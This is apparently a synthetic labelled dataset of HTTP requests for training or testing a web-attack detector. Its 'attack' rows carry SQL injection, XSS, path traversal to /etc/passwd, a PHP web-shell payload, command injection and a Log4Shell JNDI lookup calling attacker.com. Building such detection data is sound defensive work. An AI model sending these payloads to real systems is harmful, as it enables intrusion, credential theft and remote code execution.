id,timestamp,method,path,http_headers,body,label
b2b996ff-f3ef-4ed6-b635-14fb7a21b748,2026-02-24 08:00:36,POST,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
7806a5ab-9b6f-4fdc-babe-94015c3b282a,2026-02-24 18:42:53,GET,/checkout,User-Agent: Chrome/120.0.0.0,,normal
2eac6b6e-2f6b-4412-9abd-07268c7cb2f7,2026-02-25 05:31:15,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
9a5916c7-5f15-41d4-9c55-d96046349b94,2026-02-25 03:32:29,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: sqlmap/1.6,<script>alert('XSS')</script>,attack
ccb1ca41-9de0-4d40-a4b5-3b9ff25492b2,2026-02-24 10:43:32,GET,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
0859c5db-8ae3-4e94-9476-8c492a9519e8,2026-02-24 12:17:18,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
f93a8861-e7b4-4391-b09a-3e298283f9f6,2026-02-24 09:55:01,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
67bc6366-f15f-42c5-8110-cf2578f54ded,2026-02-25 04:50:05,GET,/search?q=shoes,User-Agent: Chrome/120.0.0.0,,normal
2f25587a-4c96-4065-9c87-76cf32b91e25,2026-02-25 00:19:33,GET,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: python-requests/2.25.1,' OR 1=1 --,attack
db3cf3e5-e3a7-437b-be29-9feb8e785f05,2026-02-24 23:00:56,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
23eb73d7-b271-4a2b-9d24-1f06e8b0722c,2026-02-24 12:14:57,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: sqlmap/1.6,<img src=x onerror=alert(1)>,attack
c1070155-6be9-4712-a60e-487dc81b14cb,2026-02-25 01:10:41,GET,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: python-requests/2.25.1,/admin?user=admin'--,attack
ba7dc93b-6acf-4ae7-95f3-e693b40a3617,2026-02-24 17:29:04,POST,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
7860f5bd-a89a-4338-bf6a-c9060c874e85,2026-02-24 18:53:46,POST,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: sqlmap/1.6,<script>alert('XSS')</script>,attack
8d508a6e-f35f-42ab-ac10-e3d69d031c91,2026-02-25 01:17:28,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
49bf0dd7-0e60-4617-bb59-3c691c36e543,2026-02-24 09:53:06,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: python-requests/2.25.1,"UNION SELECT username, password FROM users --",attack
0989f4c3-d88d-438e-8a22-6e7414361ea6,2026-02-25 05:08:05,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
6829e79d-35be-4f0a-a0ad-ad30e7dc3d01,2026-02-25 08:00:31,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: python-requests/2.25.1,"UNION SELECT username, password FROM users --",attack
a43974b1-360d-4ea1-a387-26f4c8d70c10,2026-02-24 17:24:54,GET,/products,User-Agent: Chrome/120.0.0.0,,normal
5bf70c84-7aa6-4300-a932-79798e4b6caf,2026-02-25 01:33:58,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
13778d2f-7a51-4559-bca4-69dba69f1df3,2026-02-24 14:52:01,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
3808bc46-3864-431a-9aa6-8bbfb5acdcbe,2026-02-24 17:14:16,POST,/contact,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
ad856b48-e4a0-4796-bb14-1bbb568eb04c,2026-02-24 18:53:52,GET,/contact,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
f6e3d87e-8fe0-417d-927a-e2cf61cd2f1c,2026-02-24 14:07:16,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),../../etc/passwd,attack
407cfcbd-c515-4445-bd6e-bac8066541c2,2026-02-24 11:31:25,POST,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
14e63541-74df-41d5-beed-e3c582444b62,2026-02-24 17:29:25,GET,/checkout,User-Agent: Safari/537.36,,normal
fbfb329c-e0ea-4fc0-8048-97593f45f5d5,2026-02-25 06:41:54,POST,/api/v1/users,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
ae6a51fc-8b31-477f-8ca8-cecde5a13b58,2026-02-25 03:57:40,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<img src=x onerror=alert(1)>,attack
9ecdc771-20a2-4857-a2b4-f2271e3b23cb,2026-02-24 23:29:10,POST,/products?id=123,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
1395bc7b-7f44-43da-9d15-5fefa2299f68,2026-02-25 05:25:57,GET,/blog/article-1,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
176e95dd-a645-4531-9a41-b9cb068c709f,2026-02-24 10:56:25,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: python-requests/2.25.1,SELECT * FROM users WHERE id = 1 OR 1=1,attack
dadf2d2d-1a31-4727-89d0-53a29a95d6bf,2026-02-24 09:58:54,GET,/blog/article-1,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
61acc68a-e715-4332-b054-90d0eb9e58b8,2026-02-24 20:35:58,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
b96c5d91-0279-4578-80c2-6671079e9186,2026-02-25 08:25:38,POST,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Nikto/2.1.6,<img src=x onerror=alert(1)>,attack
979e3e12-119e-45f5-9279-4277b5c1a483,2026-02-24 09:15:57,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
dd9b4986-056a-45e8-b9d8-74a48404086a,2026-02-24 23:09:37,POST,/home,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
989cf916-94fb-4f3e-8f6b-daa585f3abe3,2026-02-24 14:49:38,POST,/contact,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
4b764d5d-31be-4682-b75b-66bb2862b42f,2026-02-24 06:38:51,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
b2aa6f69-e843-437d-8470-6589159781f6,2026-02-25 05:16:05,POST,/contact,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
c127abf7-44b7-483e-af9a-571031f24ce6,2026-02-25 03:34:04,DELETE,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Nikto/2.1.6,<script>alert('XSS')</script>,attack
17748171-dd9f-492a-8b7a-188d5fe78b76,2026-02-24 19:16:24,POST,/home,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
8b99cbc2-c5fd-4f41-b6a4-91d795905ecc,2026-02-24 14:56:18,POST,/api/v1/orders?status=completed,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
bad7bccf-19c0-4fd2-9f0f-41d7cf5cded3,2026-02-24 22:51:00,POST,/checkout,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
e1e73c43-21fb-4b65-ba8a-a011003943fd,2026-02-24 09:07:04,POST,/products,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
8dddcfa3-bd50-4c3b-bec4-1984e9fa74e6,2026-02-25 06:42:09,GET,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
156adcce-3dcb-4518-b6e2-c28f36b1294a,2026-02-24 14:33:52,POST,/cart,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
303293d5-45a6-480f-9b2c-604abeeb5db2,2026-02-24 11:27:49,POST,/api/v1/orders?status=completed,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
8dcd4285-f492-48a5-acaa-89dd9406e10b,2026-02-24 13:42:28,POST,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
26b192c6-7910-4d8f-943d-826707d970ac,2026-02-25 10:05:32,POST,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
fcd8ab02-31e7-4a36-8e10-0c5113b2775c,2026-02-25 02:28:06,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
074b0042-e70a-460f-8c57-1cfb9d42e14f,2026-02-25 04:29:33,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
5ed306d6-f9ce-481d-9448-eaeb8f784652,2026-02-25 02:25:59,GET,/cart,User-Agent: Chrome/120.0.0.0,,normal
1014d6cb-6050-4fbd-a31a-a613afd650e5,2026-02-25 08:57:26,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
b5b025da-6f21-45bb-91da-9c311631e8b8,2026-02-25 03:19:36,POST,/cart,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
324b8dd6-3e62-4e48-ae68-6ed5455b46db,2026-02-25 04:42:22,GET,/blog/article-1,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
bff72195-8b2b-4816-9db0-44ba3a95acc6,2026-02-25 03:47:09,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
a797785a-520c-405a-8b68-e327516d25c9,2026-02-24 12:50:17,POST,/checkout,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
27f52a74-f5e6-4996-804b-20571e67eee8,2026-02-25 01:38:22,POST,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
db28fb36-cb13-46da-86ed-5a1ac7a84542,2026-02-24 17:42:28,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),/admin?user=admin'--,attack
46b6db30-078c-4496-b659-897c36737384,2026-02-24 18:09:14,POST,/contact,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
2f27c76f-c118-4c83-a870-41a07d2293df,2026-02-25 02:06:13,GET,/api/v1/orders?status=completed,User-Agent: Safari/537.36,,normal
26d1a7ff-c1e7-4d87-a920-08826ecaa207,2026-02-24 19:40:41,POST,/cart,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
d341885c-805f-4f31-b5a2-0b409e45245a,2026-02-24 11:01:34,POST,/contact,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
3d9dec12-f2b3-4552-bcba-85324dd6468f,2026-02-25 00:46:23,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
d7e0624b-b11b-4491-a6bb-043a03c0797f,2026-02-24 12:45:19,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
6671ff4a-0358-4410-9240-30fe4ee5172a,2026-02-24 22:34:18,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
1270bed2-5eb0-420f-a8b6-9ade02dce5dd,2026-02-24 19:49:36,POST,/contact,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
9c720193-a18f-4417-8916-5ae856131858,2026-02-24 17:34:52,GET,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: python-requests/2.25.1,SELECT * FROM users WHERE id = 1 OR 1=1,attack
37e62582-7750-4bc8-a137-c67773686e84,2026-02-24 12:29:45,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
033d9fa0-9d6f-4bae-ad54-8edb3b9eb51e,2026-02-25 08:26:28,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
0b5c3a78-c606-45e8-a886-4bf144ffe18f,2026-02-25 07:06:04,POST,/checkout,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
cc6d1c1a-4822-463f-a171-f1019aea0df8,2026-02-24 14:02:55,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: sqlmap/1.6,<script>alert('XSS')</script>,attack
44cab4fe-d6b5-4ba1-a522-e69c359f61c7,2026-02-25 01:48:27,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
38143315-7475-4716-84a4-d4ad7a9670b9,2026-02-25 02:35:32,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
859d6b01-ef53-4353-a122-5d732cb7e2eb,2026-02-24 16:13:47,GET,/contact,User-Agent: Safari/537.36,,normal
279bc50e-9522-4a44-83fd-53943c0989b2,2026-02-25 05:59:58,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: curl/7.68.0,"UNION SELECT username, password FROM users --",attack
70b838cc-e564-40f6-b872-9bb589c593ac,2026-02-24 22:18:41,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
5bb65178-e26a-41b3-86e2-1e26c4a2c2fd,2026-02-24 13:40:57,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: curl/7.68.0,<img src=x onerror=alert(1)>,attack
049491e7-c5ed-4412-b0fe-9573b707e5a5,2026-02-24 10:31:48,POST,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
7cb17157-9a2a-44d6-9c38-3907368c6e6b,2026-02-24 12:31:59,GET,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
0ae61c1d-e5df-4408-8431-47deffc8fd52,2026-02-25 09:29:14,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
928ca6ae-7673-4ef4-bbd7-b9ea395fd2bb,2026-02-24 18:58:41,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
d31e31c1-8f86-4752-91c9-eb7931ab4bd1,2026-02-24 10:42:47,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: python-requests/2.25.1,<?php system($_GET['cmd']); ?>,attack
bac1c4aa-42f9-4ec0-8cd9-059a9836806c,2026-02-24 20:16:09,DELETE,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: sqlmap/1.6,<?php system($_GET['cmd']); ?>,attack
1243ea8b-1435-4cb7-8a90-664682a477ae,2026-02-25 09:45:40,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
7963e9b8-ff8c-4a30-a685-cb4121f3a37d,2026-02-24 17:45:49,POST,/products?id=123,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
2e05866a-17d4-440e-a6dc-021b57159df1,2026-02-24 10:44:00,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
cdadaaf8-f454-4c33-a628-686e627632aa,2026-02-24 18:57:53,GET,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Nikto/2.1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
a9300502-e71b-4a9a-b142-09a3a9cdb8e2,2026-02-25 06:12:22,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Nikto/2.1.6,' OR 1=1 --,attack
d2d7ff07-c7d6-4574-8880-88b619684645,2026-02-24 20:33:31,POST,/api/v1/users,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
904d8ce8-e4bd-4396-b8c1-08799fd188ad,2026-02-24 23:57:59,GET,/products?id=123,User-Agent: Chrome/120.0.0.0,,normal
a67b8a26-e5bb-42e7-866d-b2a392ee4cb5,2026-02-25 08:33:44,POST,/products,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
7d3c49ea-99bd-4883-9f80-8caf1dbdf027,2026-02-25 00:31:46,POST,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
b50c7fd8-e849-4d11-8e09-5138ea3e64be,2026-02-24 20:14:27,POST,/api/v1/users,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
1d32b9c4-dde3-436d-9d6c-5fa46b38ad31,2026-02-24 18:34:00,GET,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: python-requests/2.25.1,<?php system($_GET['cmd']); ?>,attack
edfe7b8a-5ecf-4b90-a87f-717848271d1a,2026-02-24 19:51:26,POST,/checkout,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
9e579639-4714-4a52-b29f-31655574985f,2026-02-25 08:30:16,POST,/home,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
03a3e07c-a07c-44d2-8b6a-1ce79348c64b,2026-02-25 09:23:42,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
c07ac0fa-cfa9-451b-8236-2c02a267bb17,2026-02-24 18:12:03,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Nikto/2.1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
af685692-a250-4014-877e-5ca071c90508,2026-02-25 06:25:19,GET,/cart,User-Agent: Chrome/120.0.0.0,,normal
f9de5d8a-e347-4350-9e28-ef1287fd5300,2026-02-25 10:10:43,POST,/search?q=shoes,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
2bb9b357-d02c-480c-8486-52f8534825b7,2026-02-24 20:26:57,POST,/home,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
9a7d3d37-2cc9-44ca-bebf-81e3939453e0,2026-02-25 00:04:16,GET,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
1e3521ce-0fd6-4f45-bad6-7216002ce0d2,2026-02-24 20:05:04,GET,/api/v1/users,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
b8419727-544e-4aee-bc5d-1f0e6ab7740b,2026-02-25 05:06:55,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
ded00754-8b7c-4124-b332-c92b4261e6f0,2026-02-25 01:18:14,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: sqlmap/1.6,<script>alert('XSS')</script>,attack
c38a6855-ae74-4fde-8d8a-fe685016d62a,2026-02-25 04:11:40,POST,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
dde1ea89-9b5c-4159-b621-f15e25af2bc1,2026-02-25 07:44:26,GET,/checkout,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
d1b62f0c-220a-4db7-82c5-92627a4d9a64,2026-02-24 19:31:41,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
7bfa7448-2856-4216-9d02-fe49ac46d75e,2026-02-24 17:37:56,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: sqlmap/1.6,<img src=x onerror=alert(1)>,attack
cb2685fb-484d-4c7f-8c2a-ab7e29f8013e,2026-02-25 00:47:40,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
3b5c5254-b2e6-47f3-926a-eec67763b90b,2026-02-25 00:49:23,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: curl/7.68.0,SELECT * FROM users WHERE id = 1 OR 1=1,attack
deb23582-ccf5-4031-b354-e9dbcd2fd03b,2026-02-24 08:04:10,DELETE,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),/admin?user=admin'--,attack
74278b89-0044-4597-9dea-623258687b12,2026-02-24 19:54:20,GET,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),|| ping -c 4 127.0.0.1 ||,attack
8a9042b3-61dc-47ef-b34b-702510b9c453,2026-02-24 22:10:58,GET,/api/v1/users,User-Agent: Chrome/120.0.0.0,,normal
dc59347a-a3f6-47bb-9759-36fd091afd3e,2026-02-25 04:50:35,GET,/products?id=123,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
cc824fcc-83b3-42ec-ae01-42c31299dc2c,2026-02-24 22:30:44,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
50c4ac04-42d2-4005-b16d-96fb49f833fb,2026-02-24 23:06:05,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Nikto/2.1.6,|| ping -c 4 127.0.0.1 ||,attack
6ceb34cb-7406-41d9-93f2-70e48acb4b7f,2026-02-25 05:06:31,POST,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
d1e6e227-5fee-4cd1-a52e-773b061a50a8,2026-02-25 01:15:13,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: curl/7.68.0,"UNION SELECT username, password FROM users --",attack
401777e7-99e1-42e4-bc48-059f59d97329,2026-02-24 11:06:30,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
286cb508-055d-480d-a900-d770a981ee60,2026-02-24 09:20:08,PUT,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: python-requests/2.25.1,${jndi:ldap://attacker.com/a},attack
abe86bb2-cdb5-4109-be04-5121b451bb93,2026-02-24 11:46:28,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),../../etc/passwd,attack
1b40db54-0a70-473f-a84a-e6ec1854e2a5,2026-02-24 22:22:34,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
81b0629b-9f4d-4ced-81f6-81fc1363e628,2026-02-25 05:26:21,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),../../etc/passwd,attack
a79d2af4-eb34-437f-b4c5-fdf35958ddf8,2026-02-24 11:35:23,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
cf5b83be-2563-4b76-9f6d-f608a67c0ccd,2026-02-24 11:21:51,POST,/checkout,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
04d3291b-569e-45a7-8c66-ccf099abab45,2026-02-24 21:33:49,GET,/checkout,User-Agent: Safari/537.36,,normal
886ce5d6-e1ec-4231-97d5-5b0157221067,2026-02-25 07:13:31,POST,/home,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
d7936f9c-3a66-4b17-8250-0499f2961a1a,2026-02-24 14:02:46,POST,/cart,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
6b04d26f-c185-44b4-8595-684df0d7c12f,2026-02-24 08:16:40,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: sqlmap/1.6,<?php system($_GET['cmd']); ?>,attack
44154de8-6756-4c21-8940-3a36434068d2,2026-02-24 21:57:56,GET,/products,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
15bffa4c-5e48-484d-a73f-bb174a6a42bd,2026-02-24 14:38:27,POST,/search?q=shoes,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
06df8b36-150e-4b68-84a3-ad3d4e090670,2026-02-24 17:36:05,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
36ba3bbc-41ad-45d2-8ef7-6cce51fe9517,2026-02-24 11:12:10,GET,/search?q=shoes,User-Agent: Safari/537.36,,normal
d91fef58-b0d8-4bae-a97b-ff8c525210b1,2026-02-25 07:13:52,POST,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
6df3f4a2-eb00-4e5f-8637-badd13e5cfde,2026-02-24 19:49:18,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
9cdfdeef-407f-423b-bcf4-dda5ee486572,2026-02-25 02:46:41,GET,/contact,User-Agent: Safari/537.36,,normal
c07efba2-2086-4be8-8dd5-948b24656efa,2026-02-25 07:14:44,GET,/api/v1/users,User-Agent: Chrome/120.0.0.0,,normal
8f790645-e27d-46b9-a685-ff982349f6ff,2026-02-25 00:27:04,POST,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
2575d499-ff6d-4051-aa5a-7f52bbd06e1d,2026-02-25 07:59:07,GET,/cart,User-Agent: Safari/537.36,,normal
ef6d3d18-30e3-4111-860d-25b72e7ee318,2026-02-24 11:02:47,POST,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
cdb66d9c-9a99-492e-95d0-cc03097f289a,2026-02-24 08:12:23,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
7dde15c8-eea9-43c3-be76-a4b33935f628,2026-02-24 17:40:42,POST,/api/v1/users,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
2adbce3e-51cf-4679-8c42-fc0be5addd16,2026-02-24 18:37:56,GET,/api/v1/users,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
